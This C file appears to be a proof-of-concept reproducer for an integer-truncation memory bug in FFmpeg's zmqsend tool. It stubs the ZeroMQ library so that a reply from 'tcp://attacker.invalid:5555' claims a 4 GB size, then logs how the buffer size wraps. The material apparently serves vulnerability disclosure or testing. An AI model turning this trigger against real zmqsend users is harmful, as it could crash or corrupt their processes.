#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>

#define main ffmpeg_zmqsend_main
#include "tools/zmqsend.c"
#undef main

static uint8_t *reply_data;

void *zmq_ctx_new(void)
{
    return (void *)(uintptr_t)1;
}

int zmq_ctx_destroy(void *context)
{
    return 0;
}

void *zmq_socket(void *context, int type)
{
    return (void *)(uintptr_t)2;
}

int zmq_close(void *socket)
{
    return 0;
}

int zmq_connect(void *socket, const char *endpoint)
{
    return 0;
}

int zmq_send(void *socket, const void *buffer, size_t length, int flags)
{
    return (int)length;
}

int zmq_msg_init(zmq_msg_t *message)
{
    return 0;
}

int zmq_msg_recv(zmq_msg_t *message, void *socket, int flags)
{
    return 0;
}

size_t zmq_msg_size(const zmq_msg_t *message)
{
    return UINT32_MAX;
}

void *zmq_msg_data(zmq_msg_t *message)
{
    return reply_data;
}

int zmq_msg_close(zmq_msg_t *message)
{
    return 0;
}

const char *zmq_strerror(int error_number)
{
    return "stub";
}

int main(void)
{
    volatile size_t message_size = UINT32_MAX;
    const int recv_buf_size = message_size + 1;
    char *arguments[] = {
        "zmqsend",
        "-b",
        "tcp://attacker.invalid:5555",
        "-i",
        "/dev/null",
        NULL,
    };

    reply_data = mmap(NULL, message_size, PROT_READ,
                      MAP_PRIVATE | MAP_ANON, -1, 0);
    if (reply_data == MAP_FAILED) {
        fprintf(stderr, "reply_mapping_failed=1\n");
        return 2;
    }

    fprintf(stderr,
            "reply_size=%zu size_plus_one=%zu truncated_int=%d copy_size=%zu\n",
            message_size, message_size + 1, recv_buf_size,
            (size_t)(recv_buf_size - 1));
    fflush(stderr);
    ffmpeg_zmqsend_main(5, arguments);

    fprintf(stderr, "unexpected_zmqsend_success=1\n");
    munmap(reply_data, message_size);
    return 1;
}
